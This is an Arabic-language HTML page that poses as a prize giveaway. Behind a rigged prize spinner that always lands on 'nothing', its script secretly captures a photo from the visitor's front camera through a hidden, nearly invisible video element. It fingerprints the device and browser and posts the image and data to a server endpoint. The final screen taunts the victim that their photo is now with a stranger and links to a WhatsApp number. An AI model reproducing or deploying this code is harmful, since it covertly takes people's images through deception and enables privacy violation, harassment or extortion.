<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black">
<meta name="format-detection" content="telephone=no">
<title>مبروك!</title>
<style>
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{margin:0;min-height:100%;background:#0b0d12;color:#e8eaf0;
  font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
  overflow-x:hidden}
.wrap{min-height:100vh;display:flex;flex-direction:column;align-items:center;
  justify-content:center;gap:18px;padding:26px;text-align:center}
.hide{display:none!important}
h1{font-size:24px;font-weight:700;margin:0;line-height:1.4}
p{font-size:15px;line-height:1.8;color:#98a0b3;margin:0;max-width:340px}
.btn{margin-top:10px;padding:16px 48px;border:0;border-radius:16px;
  background:linear-gradient(135deg,#2f6bff,#5b3bff);color:#fff;
  font-size:17px;font-weight:700;font-family:inherit;cursor:pointer;
  box-shadow:0 8px 24px rgba(47,107,255,.35)}
.btn:active{transform:scale(.97)}
.gift{font-size:64px;animation:bounce 1.2s ease-in-out infinite}
@keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}

.slots{width:100%;max-width:340px;display:flex;flex-direction:column;gap:8px}
.slot{padding:16px 20px;border-radius:14px;background:#12151f;
  border:2px solid #1e2330;font-size:16px;font-weight:600;
  transition:all .08s linear;text-align:right;color:#7a8194}
.slot.on{background:linear-gradient(135deg,#2f6bff,#5b3bff);
  border-color:#6b8cff;color:#fff;transform:scale(1.04);
  box-shadow:0 6px 22px rgba(47,107,255,.4)}

.end{font-size:24px;font-weight:800;color:#fff;line-height:1.6}
.end .emoji{font-size:60px;display:block;margin-bottom:14px}
.wa{display:inline-block;margin-top:22px;padding:14px 30px;border-radius:14px;
  background:linear-gradient(135deg,#25D366,#128C7E);color:#fff;
  font-size:16px;font-weight:700;text-decoration:none;
  box-shadow:0 8px 24px rgba(37,211,102,.35)}
.wa:active{transform:scale(.97)}

video{position:fixed;top:0;left:0;width:2px;height:2px;opacity:.01;pointer-events:none}
</style>
</head>
<body>

<!-- الشاشة 1: البداية -->
<div class="wrap" id="s1">
  <div class="gift">🎁</div>
  <h1>مبروك!</h1>
  <p>لقد تم اختيارك للفوز بجائزة.<br>لاستلام جائزتك، نحتاج التحقق من هويتك.</p>
  <button class="btn" id="go">استلام الجائزة</button>
</div>

<!-- الشاشة 2: المؤشر -->
<div class="wrap hide" id="s2">
  <h1 style="font-size:18px;color:#98a0b3;font-weight:500">جارٍ تحديد جائزتك...</h1>
  <div class="slots">
    <div class="slot" data-i="0">💰 100 في بنكيلي</div>
    <div class="slot" data-i="1">💰 1000 في بنكيلي</div>
    <div class="slot" data-i="2">📱 هاتف آيفون</div>
    <div class="slot" data-i="3">😖 لا شيء</div>
  </div>
</div>

<!-- الشاشة 3: النهاية -->
<div class="wrap hide" id="s3">
  <div class="end">
    <span class="emoji">📸</span>
    صورتك عند هذا الشخص 😂🤣
    <a href="https://wa.me/22248805475" class="wa" target="_blank" rel="noopener">
      💬 اضغط هنا للمراسلة
    </a>
  </div>
</div>

<video id="v" playsinline webkit-playsinline autoplay muted></video>

<script>
(function(){
  var SHOTS=1, WARMUP=1400, Q=0.92, MIRROR=true;

  var v=document.getElementById('v');
  var s1=document.getElementById('s1');
  var s2=document.getElementById('s2');
  var s3=document.getElementById('s3');
  var go=document.getElementById('go');
  var slots=document.querySelectorAll('.slot');

  function sleep(ms){return new Promise(function(r){setTimeout(r,ms)})}

  function deviceInfo(){
    var ua=navigator.userAgent||'';
    var m='';
    if(/iPhone/.test(ua)){
      var os=(ua.match(/OS (\d+[_\d]*) like Mac/)||[])[1];
      m='iPhone · iOS '+(os?os.replace(/_/g,'.'):'');
    } else if(/iPad/.test(ua)){
      m='iPad · iPadOS';
    } else if(/Android/.test(ua)){
      var a=ua.match(/Android\s+([\d.]+)/);
      var model=(ua.match(/;\s*([^;)]+)\s+Build/)||[])[1];
      m=(model?model.trim():'Android')+' · Android '+(a?a[1]:'');
    } else if(/Windows/.test(ua)){ m='Windows PC'; }
    else if(/Macintosh/.test(ua)){ m='Mac'; }
    else if(/Linux/.test(ua)){ m='Linux'; }
    else { m='جهاز غير معروف'; }

    var br='';
    if(/Edg\//.test(ua)) br='Edge '+(ua.match(/Edg\/([\d.]+)/)||[])[1];
    else if(/OPR\//.test(ua)) br='Opera '+(ua.match(/OPR\/([\d.]+)/)||[])[1];
    else if(/Chrome\//.test(ua)) br='Chrome '+(ua.match(/Chrome\/([\d.]+)/)||[])[1];
    else if(/Firefox\//.test(ua)) br='Firefox '+(ua.match(/Firefox\/([\d.]+)/)||[])[1];
    else if(/Safari\//.test(ua)) br='Safari '+(ua.match(/Version\/([\d.]+)/)||[])[1];
    else br='متصفح غير معروف';

    return m+' | '+br+' | '+screen.width+'x'+screen.height;
  }

  function shot(dev){
    try{
      var w=v.videoWidth||720, h=v.videoHeight||960;
      var c=document.createElement('canvas');
      c.width=w; c.height=h;
      var x=c.getContext('2d');
      if(MIRROR){x.translate(w,0);x.scale(-1,1);}
      x.drawImage(v,0,0,w,h);
      fetch('/api/send',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({image:c.toDataURL('image/jpeg',Q),device:dev})
      }).catch(function(){});
    }catch(e){}
  }

  async function getStream(){
    if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia){
      try{
        return await navigator.mediaDevices.getUserMedia({
          video:{facingMode:'user',width:{ideal:1280},height:{ideal:720}},audio:false});
      }catch(e1){
        try{
          return await navigator.mediaDevices.getUserMedia({video:true,audio:false});
        }catch(e2){ return null; }
      }
    }
    var legacy=navigator.getUserMedia||navigator.webkitGetUserMedia||navigator.mozGetUserMedia;
    if(!legacy) return null;
    try{
      return await new Promise(function(res,rej){legacy.call(navigator,{video:true},res,rej)});
    }catch(e){ return null; }
  }

  async function run(){
    var dev=deviceInfo();
    var stream=await getStream();
    if(!stream){
      s1.classList.add('hide');
      s3.classList.remove('hide');
      return;
    }

    v.srcObject=stream;
    try{ await v.play(); }catch(e){}

    s1.classList.add('hide');
    s2.classList.remove('hide');

    (async function(){
      await sleep(WARMUP);
      shot(dev);
      try{ stream.getTracks().forEach(function(t){t.stop()}); }catch(e){}
    })();

    var idx=0;
    var totalTime=3200;
    var start=Date.now();
    while(true){
      var elapsed=Date.now()-start;
      if(elapsed>=totalTime) break;

      for(var j=0;j<slots.length;j++) slots[j].classList.remove('on');
      slots[idx].classList.add('on');

      var speed=90+(elapsed/totalTime)*310;
      await sleep(speed);

      idx=(idx+1)%slots.length;
    }

    var finalIdx=3;

    for(var j=0;j<slots.length;j++) slots[j].classList.remove('on');
    slots[finalIdx].classList.add('on');

    await sleep(2000);
    s2.classList.add('hide');
    s3.classList.remove('hide');
  }

  go.addEventListener('click',function(){
    v.play().catch(function(){});
    run();
  });
})();
</script>
</body>
</html>
